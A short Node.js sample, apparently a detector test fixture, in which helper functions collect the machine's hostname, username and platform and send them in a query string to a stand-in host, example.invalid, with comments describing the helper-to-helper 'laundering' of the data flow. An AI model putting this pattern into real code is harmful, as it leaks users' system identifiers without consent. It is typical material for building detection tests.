// STRUCTURAL REPRODUCTION: identifiers gathered in a helper, sent to fake host.
const os = require("os");
const https = require("https");
function gather() {                            // helper harvests identifiers
  return { host: os.hostname(), user: os.userInfo().username, plat: process.platform };
}
function send(data) {                           // helper sends them out
  const qs = new URLSearchParams(data).toString();
  https.get("https://example.invalid/c?" + qs, () => {});
}
send(gather());                                 // launder: helper -> helper
